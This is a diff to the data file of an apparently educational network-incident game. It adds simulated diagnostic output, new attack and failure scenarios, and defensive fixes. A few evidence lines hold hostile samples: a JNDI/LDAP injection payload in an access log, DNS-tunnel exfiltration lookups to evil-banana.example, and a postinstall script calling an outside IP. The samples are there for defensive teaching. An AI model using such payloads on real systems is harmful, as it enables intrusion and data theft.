@@ -195,7 +195,13 @@
     "{node} hit an unhandled error after the morning traffic spike.",
     "A config reload on {node} went wrong and the process died."
    ],
-   "effect": "every call it makes to {origin} is refused"
+   "effect": "every call it makes to {origin} is refused",
+   "evidence": [
+    "$ systemctl status {node}",
+    "● {node}.service - failed (Result: exit-code)",
+    "  Main PID: 4417 (code=exited, status=139/SEGV)",
+    "$ ss -ltnp | grep :443   → (nothing listening)"
+   ]
   },
   "dns": {
    "emoji": "📛",
@@ -227,7 +233,13 @@
     "A typo slipped into {node}'s resolver config during a 'quick' change.",
     "{node}'s upstream resolver was swapped for one that doesn't answer."
    ],
-   "effect": "it can't look up {origin}'s names, so its requests fail"
+   "effect": "it can't look up {origin}'s names, so its requests fail",
+   "evidence": [
+    "$ dig @{ip} api.jungle +short",
+    ";; connection timed out; no servers could be reached",
+    "$ journalctl -u named | tail -1",
+    "zone jungle/IN: loading from master file failed: bad dotted quad"
+   ]
   },
   "dhcp": {
    "emoji": "🏷️",
@@ -260,7 +272,12 @@
     "A batch of new sensors joined {node} and took every free address.",
     "Someone shrank {node}'s DHCP range while tidying up."
    ],
-   "effect": "new devices that reach it through {origin} get no address"
+   "effect": "new devices that reach it through {origin} get no address",
+   "evidence": [
+    "$ grep DHCPNAK /var/log/syslog | wc -l   → 1,284",
+    "dhcpd: no free leases on subnet 10.4.0.0/24",
+    "pool 10.4.0.10-10.4.0.250: 241/241 leased"
+   ]
   },
   "cable": {
    "emoji": "🐊",
@@ -293,7 +310,13 @@
     "A crocodile chewed through {node}'s uplink cable.",
     "A falling branch crushed the cable into {node}."
    ],
-   "effect": "its traffic through {origin} keeps getting dropped"
+   "effect": "its traffic through {origin} keeps getting dropped",
+   "evidence": [
+    "$ ethtool eth0",
+    "  Link detected: no",
+    "$ ip -s link show eth0   → CRC errors: 48,113",
+    "physical layer flapping: carrier lost 37× in 5 min"
+   ]
   },
   "route": {
    "emoji": "🧭",
@@ -325,7 +348,13 @@
     "A route to {node} was deleted during maintenance.",
     "{node} learned a bad route from a neighbour."
    ],
-   "effect": "packets it sends via {origin} never arrive"
+   "effect": "packets it sends via {origin} never arrive",
+   "evidence": [
+    "$ traceroute core-router",
+    "  1 {ip}  2 * * *  3 * * *",
+    "$ ip route get 10.0.0.1   → unreachable",
+    "static route to 10.0.0.0/8 points at a dead next hop"
+   ]
   },
   "ddos": {
    "emoji": "🦬",
@@ -367,7 +396,14 @@
     "A botnet of a million bison found {node} on the open internet.",
     "Someone posted {node}'s address on a stampede forum."
    ],
-   "effect": "the flood through {origin} is crushing it too"
+   "effect": "the flood through {origin} is crushing it too",
+   "footprint": "{bw} inbound · {pps} · {bots} bison",
+   "evidence": [
+    "$ nload -t 1000 eth0   → {bw}",
+    "$ ss -s   → 2,104,551 SYN-RECV",
+    "top talkers: 41,000 sources, none seen before today",
+    "HTTP 200 ratio: 3% (normal: 99%)"
+   ]
   },
   "worm": {
    "emoji": "🐛",
@@ -412,6 +448,13 @@
    "origin": [
     "Someone on {node} opened a banana-themed email attachment.",
     "An unpatched service on {node} was found by a scanning worm."
+   ],
+   "footprint": "{conns} infection attempts/min",
+   "evidence": [
+    "$ ps aux --sort=-%cpu | head -2",
+    "  root  ./.cache/x7  98% CPU  (unsigned binary)",
+    "$ ss -tnp | grep :445 | wc -l   → 3,904 outbound",
+    "CVE match: unpatched SMB service, exploit in the wild"
    ]
   },
   "cert": {
@@ -453,7 +496,12 @@
     "{node}'s certificate auto-renewal has been failing quietly for weeks.",
     "{node}'s certificate was issued by hand a year ago, and nobody set a reminder."
    ],
-   "effect": "TLS handshakes with {origin} fail"
+   "effect": "TLS handshakes with {origin} fail",
+   "evidence": [
+    "$ openssl s_client -connect {ip}:443 | openssl x509 -noout -dates",
+    "notAfter=Oct 19 00:00:00 2026 GMT   (expired)",
+    "clients: x509: certificate has expired or is not yet valid"
+   ]
   },
   "leak": {
    "emoji": "📈",
@@ -489,7 +537,13 @@
     "The new release on {node} forgets to free its cache.",
     "A slow memory leak in {node} has been growing since Monday."
    ],
-   "effect": "its calls to {origin} time out"
+   "effect": "its calls to {origin} time out",
+   "footprint": "{conns} objects never freed per minute",
+   "evidence": [
+    "$ free -h   → Mem used 61G/64G, Swap 15G/16G",
+    "$ pmap -x $(pidof {node}) | tail -1   → total 58G",
+    "RSS grows linearly since the last deploy: nothing is freed"
+   ]
   },
   "disk": {
    "emoji": "💾",
@@ -527,7 +581,13 @@
     "{node}'s snapshots haven't been pruned since spring.",
     "A debug log on {node} was left on, writing gigabytes an hour."
    ],
-   "effect": "its writes to {origin} are rejected"
+   "effect": "its writes to {origin} are rejected",
+   "footprint": "{size} written in the last hour",
+   "evidence": [
+    "$ df -h /   → 100% used, 0 B free",
+    "$ du -sh /var/lib/snapshots   → most of the disk",
+    "writes failing: No space left on device (ENOSPC)"
+   ]
   },
   "heat": {
    "emoji": "🌡️",
@@ -557,7 +617,13 @@
     "The afternoon sun is on {node}'s rack and a fan is clogged with leaves.",
     "{node}'s cooling vent is blocked by a fallen palm frond."
    ],
-   "effect": "{origin} answers so slowly that it times out"
+   "effect": "{origin} answers so slowly that it times out",
+   "evidence": [
+    "$ ipmitool sensor | grep -i temp",
+    "CPU1 Temp  | 97 C | critical",
+    "fan2       | 0 RPM | nr (non-recoverable)",
+    "CPU throttled to 800 MHz to survive"
+   ]
   },
   "power": {
    "emoji": "⚡",
@@ -580,7 +646,12 @@
    "origin": [
     "A storm cloud's lightning struck {node}'s power supply."
    ],
-   "effect": "it lost its link through {origin}"
+   "effect": "it lost its link through {origin}",
+   "evidence": [
+    "$ ipmitool chassis status",
+    "System Power : off   Last Power Event : ac-failed",
+    "UPS: on battery, 4 min left"
+   ]
   },
   "deploy": {
    "emoji": "📦",
@@ -623,7 +694,12 @@
     "v2.4 went out to {node} without a canary.",
     "A Friday-afternoon deploy reached {node}."
    ],
-   "effect": "one in three requests to {origin} returns an error"
+   "effect": "one in three requests to {origin} returns an error",
+   "evidence": [
+    "$ kubectl rollout history deploy/{node}",
+    "REVISION 41 (10 min ago)  ← errors began here",
+    "error rate 0.1% → 38% right after the deploy"
+   ]
   },
   "migration": {
    "emoji": "📦",
@@ -649,7 +725,13 @@
    "origin": [
     "v2.4 went out to {node} with a database migration."
    ],
-   "effect": "one in three requests to {origin} returns an error"
+   "effect": "one in three requests to {origin} returns an error",
+   "footprint": "{records} rows half-migrated",
+   "evidence": [
+    "$ migrate status",
+    "20261019_split_users: FAILED at step 3 of 5",
+    "schema half-applied: column `bananas_v2` exists, code still reads `bananas`"
+   ]
   },
   "disparity": {
    "emoji": "⚖️",
@@ -679,7 +761,13 @@
     "A replica of {node} fell behind during a network blip and nobody noticed.",
     "Writes to {node} went to the wrong replica during a failover."
    ],
-   "effect": "it reads stale or conflicting data from {origin}"
+   "effect": "it reads stale or conflicting data from {origin}",
+   "footprint": "{records} rows disagree",
+   "evidence": [
+    "$ pg-compare primary replica --table orders",
+    "48,112 rows differ",
+    "replication lag: 7,340 s and growing"
+   ]
   },
   "loop": {
    "emoji": "🔁",
@@ -708,7 +796,13 @@
     "Two routers near {node} each think the other has the best path.",
     "A static route on {node} points back at itself."
    ],
-   "effect": "packets through {origin} go round in circles"
+   "effect": "packets through {origin} go round in circles",
+   "footprint": "{pps} circling forever",
+   "evidence": [
+    "$ tcpdump -c 5 -e   → the same frame 5× in 2 ms",
+    "switch CPU 100%, MAC table flapping between ports 3 and 7",
+    "no spanning tree: two cables close a loop"
+   ]
   },
   "broadcast": {
    "emoji": "📢",
@@ -736,7 +830,13 @@
     "Someone plugged both ends of a cable into {node}.",
     "A redundant link was added to {node} without Spanning Tree."
    ],
-   "effect": "the broadcast flood from {origin} swamps it"
+   "effect": "the broadcast flood from {origin} swamps it",
+   "footprint": "{pps} of broadcast frames",
+   "evidence": [
+    "$ tcpdump -n broadcast | pv -l -r > /dev/null   → 180k frames/s",
+    "ARP who-has storms from one misconfigured host",
+    "every host on the segment spends its CPU reading them"
+   ]
   },
   "vlan": {
    "emoji": "🏝️",
@@ -764,7 +864,12 @@
     "A port change on {node} put servers in the wrong VLAN.",
     "{node} was re-cabled and the VLAN tags weren't updated."
    ],
-   "effect": "it can't reach anything behind {origin}"
+   "effect": "it can't reach anything behind {origin}",
+   "evidence": [
+    "$ show interfaces trunk   → VLAN 40 not allowed on Gi0/1",
+    "hosts in VLAN 40 can't reach their gateway",
+    "a trunk change this morning dropped the tag"
+   ]
   },
   "upstream": {
    "emoji": "📉",
@@ -775,6 +880,471 @@
    "weight": 0,
    "concept": "origin",
    "responses": {}
+  },
+  "bgp": {
+   "emoji": "🗺️",
+   "name": "BGP route hijack",
+   "group": "network",
+   "ttl": 45,
+   "min_progress": 0.3,
+   "min_level": 2,
+   "concept": "bgp",
+   "kinds": [
+    "router",
+    "firewall",
+    "cdn"
+   ],
+   "symptom": "Half the internet now thinks our addresses live somewhere else. Traffic is walking off to a stranger's network.",
+   "footprint": "{bw} rerouted away",
+   "responses": {
+    "rpki": {
+     "effect": "fix",
+     "note": "Invalid route announcements are rejected: only we may announce our prefix."
+    },
+    "morespecific": {
+     "effect": "mitigate",
+     "secs": 40,
+     "note": "Longer prefixes win, so most traffic comes home. The bad route is still out there."
+    },
+    "fixroute": {
+     "effect": "none",
+     "note": "Our own routes are fine: the bad one is announced by someone else."
+    }
+   },
+   "decoys": [
+    "restart",
+    "fixdns"
+   ],
+   "origin": [
+    "A neighbouring network fat-fingered a route and claimed {node}'s addresses.",
+    "A mischievous magpie network announced {node}'s prefix to the whole internet."
+   ],
+   "effect": "its traffic through {origin} wanders off to a stranger's network",
+   "evidence": [
+    "$ bgpq lookup 10.0.0.0/16",
+    "origin AS64512 (us) AND AS666 (not us!)",
+    "RPKI: AS666 announcement is INVALID",
+    "traceroute leaves the jungle after 3 hops"
+   ]
+  },
+  "ransomware": {
+   "emoji": "🔒",
+   "name": "Ransomware",
+   "group": "security",
+   "ttl": 45,
+   "min_progress": 0.35,
+   "min_level": 2,
+   "concept": "ransomware",
+   "kinds": [
+    "server",
+    "database",
+    "vault",
+    "terminal",
+    "queue"
+   ],
+   "symptom": "Files are being renamed to *.locked and a note demands 400 bananas.",
+   "footprint": "{size} encrypted so far",
+   "warning": {
+    "emoji": "📡",
+    "text": "A machine is quietly beaconing to an unknown server every 60 seconds.",
+    "prevent": [
+     "quarantine",
+     "sinkhole"
+    ],
+    "ttl": 70
+   },
+   "responses": {
+    "restore": {
+     "effect": "fix",
+     "note": "Clean files are back from backups the attacker could not touch."
+    },
+    "quarantine": {
+     "effect": "mitigate",
+     "secs": 40,
+     "note": "Isolated: the encryption can't reach more shares. The locked files are still locked."
+    },
+    "restart": {
+     "effect": "none",
+     "note": "The files stay encrypted after a reboot."
+    }
+   },
+   "decoys": [
+    "cleanup",
+    "rotatecert"
+   ],
+   "origin": [
+    "Someone on {node} opened 'free_bananas.pdf.exe'.",
+    "An old remote-desktop port on {node} had a guessable password."
+   ],
+   "effect": "its shared files on {origin} are locked",
+   "evidence": [
+    "$ find /srv -name '*.locked' | wc -l   → 1,904,221",
+    "README_BANANAS.txt dropped in every folder",
+    "$ ss -tnp   → TLS session to 203.0.113.66 (unknown)",
+    "backups: immutable copy from 02:00 is intact"
+   ]
+  },
+  "creds": {
+   "emoji": "🗝️",
+   "name": "Credential stuffing",
+   "group": "security",
+   "ttl": 50,
+   "min_progress": 0.2,
+   "concept": "auth",
+   "kinds": [
+    "auth",
+    "balancer",
+    "cdn"
+   ],
+   "symptom": "Millions of logins with passwords leaked from other sites. A few are working.",
+   "footprint": "{rps} login attempts · {bots} sources",
+   "responses": {
+    "mfa": {
+     "effect": "fix",
+     "note": "A stolen password alone no longer gets anyone in."
+    },
+    "ratelimit": {
+     "effect": "mitigate",
+     "secs": 40,
+     "note": "Fewer guesses per second, but they keep coming."
+    },
+    "blockacl": {
+     "effect": "none",
+     "note": "The guesses come from everywhere: there's no short list of sources to block."
+    }
+   },
+   "decoys": [
+    "rotatecert",
+    "restart"
+   ],
+   "origin": [
+    "A password dump from another site turned up, and {node} is the obvious place to try it.",
+    "A bot-herder rented a million home routers to try passwords on {node}."
+   ],
+   "effect": "accounts used through {origin} are being taken over",
+   "evidence": [
+    "$ grep 'login failed' auth.log | wc -l   → 3,881,027 in 10 min",
+    "success rate 0.4%: ~15,000 accounts compromised",
+    "user agents: 1 browser string, 900k IPs"
+   ]
+  },
+  "ntp": {
+   "emoji": "⏰",
+   "name": "Clock drift",
+   "group": "systems",
+   "ttl": 55,
+   "concept": "time",
+   "kinds": [
+    "auth",
+    "server",
+    "queue",
+    "database",
+    "dns"
+   ],
+   "symptom": "This machine thinks it is seven minutes in the future. Logins and certificates are being rejected as 'not yet valid'.",
+   "responses": {
+    "ntp": {
+     "effect": "fix",
+     "note": "Clock back in step: tokens and certificates make sense again."
+    },
+    "rotatecert": {
+     "effect": "none",
+     "note": "A new certificate looks 'not yet valid' to a clock that's wrong too."
+    }
+   },
+   "decoys": [
+    "restart",
+    "fixdns"
+   ],
+   "origin": [
+    "{node}'s time server was quietly switched off last week.",
+    "A virtual machine on {node} was paused and resumed, and its clock never caught up."
+   ],
+   "effect": "tokens signed on {origin} look like they come from the future",
+   "evidence": [
+    "$ chronyc tracking   → System time: 412.7 s slow of NTP time",
+    "$ date -u vs ntp: Δ 6m53s",
+    "JWT error: token used before issued (iat in the future)"
+   ]
+  },
+  "mtu": {
+   "emoji": "📏",
+   "name": "MTU black hole",
+   "group": "network",
+   "ttl": 55,
+   "min_level": 2,
+   "concept": "mtu",
+   "kinds": [
+    "router",
+    "firewall",
+    "switch",
+    "river"
+   ],
+   "symptom": "Small requests work; big downloads hang forever. Ping is fine, which makes it extra confusing.",
+   "responses": {
+    "mss": {
+     "effect": "fix",
+     "note": "TCP segments now fit the tunnel; nothing needs fragmenting."
+    },
+    "restart": {
+     "effect": "none",
+     "note": "The packets are still too big for the path."
+    }
+   },
+   "decoys": [
+    "replacecable",
+    "fixroute"
+   ],
+   "origin": [
+    "A new VPN tunnel on {node} shrank the path, and a firewall eats the 'packet too big' messages.",
+    "{node} got jumbo frames turned on, but the river link didn't."
+   ],
+   "effect": "big transfers through {origin} freeze half-way",
+   "evidence": [
+    "$ ping -M do -s 1472 core   → Frag needed and DF set (mtu = 1400)",
+    "$ ping -s 56 core   → fine",
+    "ICMP type 3 code 4 blocked by a firewall rule"
+   ]
+  },
+  "splitbrain": {
+   "emoji": "🧠",
+   "name": "Split brain",
+   "group": "advanced",
+   "ttl": 45,
+   "min_level": 2,
+   "min_progress": 0.3,
+   "concept": "quorum",
+   "kinds": [
+    "database",
+    "vault",
+    "queue",
+    "lake"
+   ],
+   "symptom": "Two copies both think they are in charge and both accept writes. Their data is drifting apart by the second.",
+   "footprint": "{records} conflicting writes",
+   "responses": {
+    "fence": {
+     "effect": "fix",
+     "note": "One primary again: the stale one is powered off and will rejoin as a replica."
+    },
+    "readonly": {
+     "effect": "mitigate",
+     "secs": 35,
+     "note": "No new conflicts, but nobody can write anything either."
+    },
+    "failover": {
+     "effect": "none",
+     "note": "Failing over makes a third leader. Not helpful."
+    }
+   },
+   "decoys": [
+    "resync",
+    "restart"
+   ],
+   "origin": [
+    "A network hiccup cut {node}'s cluster in half and each half elected a leader.",
+    "Someone restarted {node}'s cluster manager with quorum checks switched off."
+   ],
+   "effect": "reads through {origin} get different answers each time",
+   "evidence": [
+    "$ pcs status   → 2 nodes Promoted (expected 1)",
+    "partition: {node}-a | {node}-b, no quorum device",
+    "writes accepted on both sides since 14:02"
+   ]
+  },
+  "exfil": {
+   "emoji": "🕵️",
+   "name": "Data exfiltration",
+   "group": "security",
+   "ttl": 50,
+   "min_level": 2,
+   "min_progress": 0.3,
+   "concept": "exfil",
+   "kinds": [
+    "database",
+    "vault",
+    "dns",
+    "ai-core",
+    "server"
+   ],
+   "symptom": "Someone is smuggling data out, one tiny DNS question at a time.",
+   "footprint": "{size} staged · {records} records",
+   "warning": {
+    "emoji": "🔦",
+    "text": "Odd TXT lookups for random-looking subdomains, all night.",
+    "prevent": [
+     "sinkhole"
+    ],
+    "ttl": 70
+   },
+   "responses": {
+    "sinkhole": {
+     "effect": "fix",
+     "note": "The smuggler's domain now leads nowhere, and every stolen key is useless."
+    },
+    "blockacl": {
+     "effect": "mitigate",
+     "secs": 35,
+     "note": "This exit is blocked; they'll look for another."
+    },
+    "restart": {
+     "effect": "none",
+     "note": "The implant starts again with the machine."
+    }
+   },
+   "decoys": [
+    "cleanup",
+    "rotatecert"
+   ],
+   "origin": [
+    "A poisoned browser plugin on {node} has been whispering secrets for a week.",
+    "A quiet intruder set up camp in {node} and is packing up the silverware."
+   ],
+   "effect": "secrets that pass through {origin} are being copied out",
+   "evidence": [
+    "$ tcpdump -n port 53 | head -3",
+    "TXT? 4a6f6b6573.x.evil-banana.example",
+    "TXT? 6f6e2079.x.evil-banana.example",
+    "entropy of subdomains: 4.9 bits/char (normal ~2.5)"
+   ]
+  },
+  "stampede": {
+   "emoji": "🐃",
+   "name": "Cache stampede",
+   "group": "systems",
+   "ttl": 45,
+   "concept": "cache",
+   "kinds": [
+    "banana-cache",
+    "cdn",
+    "database",
+    "balancer"
+   ],
+   "symptom": "A popular cache entry expired and ten thousand requests all ran to the database at once.",
+   "footprint": "{rps} cache misses",
+   "responses": {
+    "warmcache": {
+     "effect": "fix",
+     "note": "Hot keys are warm again and only one request refills each miss."
+    },
+    "ratelimit": {
+     "effect": "mitigate",
+     "secs": 35,
+     "note": "The herd is held back at the gate. The cache is still cold."
+    },
+    "restart": {
+     "effect": "none",
+     "note": "A restarted cache is an empty cache: even more misses."
+    }
+   },
+   "decoys": [
+    "expandpool",
+    "cleanup"
+   ],
+   "origin": [
+    "Every key on {node} was set to expire at exactly midnight.",
+    "A flash sale on golden bananas emptied {node}'s cache."
+   ],
+   "effect": "requests through {origin} wait in a very long queue",
+   "evidence": [
+    "$ cachectl stats   → hit ratio 4% (normal 97%)",
+    "$ pg_stat_activity: 9,850 identical queries waiting",
+    "all keys share one TTL: they expired together"
+   ]
+  },
+  "zeroday": {
+   "emoji": "🧨",
+   "name": "Zero-day exploit",
+   "group": "security",
+   "ttl": 40,
+   "min_level": 3,
+   "min_progress": 0.4,
+   "concept": "zeroday",
+   "kinds": [
+    "cdn",
+    "auth",
+    "server",
+    "balancer",
+    "ai-core"
+   ],
+   "symptom": "A brand-new bug with no patch yet. Strange requests are making the service do things it shouldn't.",
+   "footprint": "{rps} exploit attempts",
+   "responses": {
+    "virtualpatch": {
+     "effect": "fix",
+     "note": "The firewall now blocks the exploit pattern until a real patch ships."
+    },
+    "quarantine": {
+     "effect": "mitigate",
+     "secs": 35,
+     "note": "Cut off from the rest; it's still vulnerable."
+    },
+    "patch": {
+     "effect": "none",
+     "note": "There is no patch yet: that's what zero-day means."
+    }
+   },
+   "decoys": [
+    "restart",
+    "rollback"
+   ],
+   "origin": [
+    "A clever weasel found a bug in {node} that nobody knew about.",
+    "A proof-of-concept for {node}'s web framework was posted an hour ago."
+   ],
+   "effect": "requests from {origin} carry the exploit along",
+   "evidence": [
+    "$ tail access.log   → GET /api?q=${jndi:ldap://203.0.113.9/a}",
+    "vendor advisory: CVE-2026-1337, no fix available",
+    "process spawned /bin/sh from the web server"
+   ]
+  },
+  "supplychain": {
+   "emoji": "📦",
+   "name": "Poisoned dependency",
+   "group": "security",
+   "ttl": 50,
+   "min_level": 2,
+   "min_progress": 0.35,
+   "concept": "supplychain",
+   "kinds": [
+    "server",
+    "auth",
+    "queue",
+    "ai-core",
+    "cdn"
+   ],
+   "symptom": "Last night's build picked up a library update with a hidden backdoor.",
+   "footprint": "{conns} hosts running the bad build",
+   "responses": {
+    "pinrevert": {
+     "effect": "fix",
+     "note": "Rebuilt from a signed, pinned lockfile: the bad version is gone."
+    },
+    "rollback": {
+     "effect": "mitigate",
+     "secs": 35,
+     "note": "Yesterday's build runs for now; the next build will pull the bad version again."
+    },
+    "patch": {
+     "effect": "none",
+     "note": "The 'update' is the problem."
+    }
+   },
+   "decoys": [
+    "restart",
+    "rotatecert"
+   ],
+   "origin": [
+    "A maintainer's account for banana-utils was taken over and a new version shipped.",
+    "{node}'s build used a package with a name one letter off from the real one."
+   ],
+   "effect": "everything {origin} builds carries the backdoor",
+   "evidence": [
+    "$ npm ls banana-utils   → banana-utils@2.4.2 (published 3h ago)",
+    "postinstall script curls 198.51.100.7",
+    "2.4.2 has no signature; 2.4.1 is signed"
+   ]
   }
  },
  "actions": {
@@ -909,8 +1479,7 @@
    "maintenance": true,
    "cmd": "snapctl prune {node} --older-than 30d",
    "out": [
-    "deleted 112 snapshots",
-    "freed 1.8 TB",
+    "pruned 112,408 snapshots across the cluster",
     "disk: 99% → 41%"
    ]
   },
@@ -1008,6 +1577,137 @@
     "ARP table rebuilt",
     "gateway reachable"
    ]
+  },
+  "rpki": {
+   "emoji": "🛡️",
+   "label": "Enforce RPKI origin validation",
+   "secs": 3,
+   "cmd": "router bgp 64512 && rpki validate --reject-invalid",
+   "out": [
+    "RPKI cache synced: 512k ROAs",
+    "rejected 1 invalid announcement for 10.0.0.0/16",
+    "best path restored via AS64512"
+   ]
+  },
+  "morespecific": {
+   "emoji": "📣",
+   "label": "Announce more-specific /24s",
+   "secs": 2,
+   "cmd": "bgp announce 10.0.0.0/24 10.0.1.0/24",
+   "out": [
+    "announcing 2 more-specific prefixes",
+    "longest prefix wins: most traffic comes home"
+   ]
+  },
+  "restore": {
+   "emoji": "🧊",
+   "label": "Restore from immutable backups",
+   "secs": 4,
+   "heavy": true,
+   "cmd": "restic restore latest --target /srv/{node} --verify",
+   "out": [
+    "snapshot 9f2e1c (immutable, 02:00 today)",
+    "restoring files…",
+    "verified: checksums match"
+   ]
+  },
+  "mfa": {
+   "emoji": "🔐",
+   "label": "Force MFA + reset sessions",
+   "secs": 3,
+   "cmd": "idp policy set mfa=required && idp sessions revoke --all",
+   "out": [
+    "MFA now required for every account",
+    "revoked 48,211 sessions",
+    "stolen passwords alone no longer work"
+   ]
+  },
+  "ntp": {
+   "emoji": "⏰",
+   "label": "Resync the clock (NTP)",
+   "secs": 2,
+   "cmd": "chronyc makestep && chronyc tracking",
+   "out": [
+    "clock stepped by -412.7 s",
+    "System time: 0.000014 s fast of NTP time",
+    "tokens validate again"
+   ]
+  },
+  "mss": {
+   "emoji": "📏",
+   "label": "Clamp TCP MSS to the path MTU",
+   "secs": 3,
+   "cmd": "iptables -t mangle -A FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu",
+   "out": [
+    "MSS clamped to 1360",
+    "large transfers complete again"
+   ]
+  },
+  "fence": {
+   "emoji": "🚧",
+   "label": "Fence the stale primary (STONITH)",
+   "secs": 3,
+   "heavy": true,
+   "cmd": "pcs stonith fence {node}-b && pcs status",
+   "out": [
+    "node {node}-b fenced (powered off)",
+    "quorum: 2 of 3 votes, one primary",
+    "writes go to one place again"
+   ]
+  },
+  "readonly": {
+   "emoji": "📖",
+   "label": "Switch to read-only mode",
+   "secs": 2,
+   "cmd": "psql -c \"ALTER SYSTEM SET default_transaction_read_only = on\"",
+   "out": [
+    "writes paused: reads keep working",
+    "no new conflicts can be written"
+   ]
+  },
+  "sinkhole": {
+   "emoji": "🕳️",
+   "label": "Sinkhole the C2 domain + rotate keys",
+   "secs": 3,
+   "cmd": "rpz add evil-banana.example CNAME . && vault rotate --all",
+   "out": [
+    "C2 domain now resolves nowhere",
+    "rotated 214 keys and tokens",
+    "outbound tunnel collapsed"
+   ]
+  },
+  "warmcache": {
+   "emoji": "🔥",
+   "label": "Warm the cache, coalesce requests",
+   "secs": 3,
+   "maintenance": true,
+   "cmd": "cachectl warm {node} --top 50000 && cachectl coalesce on",
+   "out": [
+    "warmed 50,000 hot keys",
+    "request coalescing on: one miss, one DB query",
+    "database load back to normal"
+   ]
+  },
+  "virtualpatch": {
+   "emoji": "🧩",
+   "label": "Deploy a WAF virtual patch",
+   "secs": 3,
+   "cmd": "waf rules add --block 'CVE-2026-1337' --scope {node}",
+   "out": [
+    "rule 900137 active",
+    "exploit attempts now blocked at the edge"
+   ]
+  },
+  "pinrevert": {
+   "emoji": "📌",
+   "label": "Pin deps + rebuild from lockfile",
+   "secs": 4,
+   "cmd": "git checkout lockfile@verified && make build verify-sbom",
+   "out": [
+    "pinned banana-utils@2.4.1 (signed)",
+    "SBOM verified: 0 unknown packages",
+    "clean build deployed"
+   ]
   }
  },
  "concepts": {
@@ -1090,6 +1790,46 @@
   "origin": {
    "name": "Root cause and blast radius",
    "text": "One fault at its origin spreads effects to everything that depends on it. Fixing the symptoms downstream does nothing; fix the origin and the symptoms clear by themselves."
+  },
+  "bgp": {
+   "name": "BGP and RPKI",
+   "text": "Networks announce which addresses they own with BGP. Anyone can announce anything, so RPKI signs who may announce what, and routers reject the rest."
+  },
+  "ransomware": {
+   "name": "Ransomware and immutable backups",
+   "text": "Ransomware encrypts files and asks for payment. Backups that cannot be changed (immutable, offline) are what make it a bad day instead of a disaster."
+  },
+  "auth": {
+   "name": "Credential stuffing and MFA",
+   "text": "Leaked passwords from one site get tried on others. Multi-factor authentication means a password alone isn't enough."
+  },
+  "time": {
+   "name": "Clock sync (NTP)",
+   "text": "Certificates, tokens and logs all depend on the time. NTP keeps clocks in step; a few minutes of drift breaks logins."
+  },
+  "mtu": {
+   "name": "MTU and MSS",
+   "text": "Every link has a largest packet size (MTU). If 'packet too big' messages are blocked, big transfers silently hang. Clamping TCP MSS avoids it."
+  },
+  "quorum": {
+   "name": "Split brain and quorum",
+   "text": "A cluster needs a majority (quorum) to pick one leader. Without it both halves may lead; fencing (STONITH) powers off the stale one."
+  },
+  "exfil": {
+   "name": "Exfiltration and DNS tunnels",
+   "text": "Attackers hide stolen data in ordinary-looking traffic, even DNS lookups. Sinkholing their domain and rotating keys cuts them off."
+  },
+  "cache": {
+   "name": "Cache stampede",
+   "text": "When a hot cache entry expires, many requests miss at once and hammer the database. Request coalescing and staggered expiry prevent it."
+  },
+  "zeroday": {
+   "name": "Zero-days and virtual patches",
+   "text": "A zero-day has no vendor patch yet. A WAF rule that blocks the exploit pattern (a virtual patch) protects you until one ships."
+  },
+  "supplychain": {
+   "name": "Supply-chain attacks",
+   "text": "Your code is only as safe as what it depends on. Pinned, signed versions and an SBOM let you rebuild from known-good parts."
   }
  },
  "notices": [
@@ -1209,5 +1949,95 @@
   "cdn": "A content delivery network caches content close to users."
  },
  "run_secs": 2.5,
- "hint_cost": 1
+ "hint_cost": 1,
+ "difficulties": [
+  {
+   "name": "Recruit",
+   "emoji": "🐣",
+   "level": 1,
+   "heat": 0.0,
+   "blurb": "Coached training shift. A gentle, scripted start."
+  },
+  {
+   "name": "Operator",
+   "emoji": "🐵",
+   "level": 2,
+   "heat": 0.1,
+   "blurb": "A normal day on call. Trouble shows up one or two at a time."
+  },
+  {
+   "name": "Veteran",
+   "emoji": "🦍",
+   "level": 3,
+   "heat": 0.25,
+   "campaigns": true,
+   "blurb": "Faster timers and coordinated attack campaigns."
+  },
+  {
+   "name": "Jungle Legend",
+   "emoji": "👑",
+   "level": 3,
+   "heat": 0.45,
+   "ttl_mult": 0.85,
+   "interval_mult": 0.8,
+   "roots_add": 1,
+   "campaigns": true,
+   "blurb": "Everything at once. The bison have brought friends."
+  }
+ ],
+ "lengths": [
+  {
+   "name": "Quick",
+   "secs": 240,
+   "blurb": "4 min · a coffee break"
+  },
+  {
+   "name": "Standard",
+   "secs": 480,
+   "blurb": "8 min · a full 09:00-17:00 day"
+  },
+  {
+   "name": "Long",
+   "secs": 720,
+   "blurb": "12 min · overtime"
+  },
+  {
+   "name": "Marathon",
+   "secs": 1080,
+   "blurb": "18 min · the night shift too"
+  }
+ ],
+ "campaigns": [
+  {
+   "at": 0.4,
+   "emoji": "🦬",
+   "name": "The Great Stampede",
+   "text": "A herd of botnet bison is charging the front door while someone tries every password on the login page.",
+   "faults": [
+    "ddos",
+    "creds"
+   ]
+  },
+  {
+   "at": 0.65,
+   "emoji": "🐍",
+   "name": "The Velvet Python",
+   "text": "A sneaky crew is slipping in quietly. Watch for data leaving by odd doors.",
+   "faults": [
+    "exfil",
+    "supplychain"
+   ]
+  },
+  {
+   "at": 0.86,
+   "emoji": "🌙",
+   "name": "Nightfall",
+   "text": "The big one, right before closing time: routes, files and floods all at once.",
+   "faults": [
+    "bgp",
+    "ransomware",
+    "ddos"
+   ]
+  }
+ ]
 }
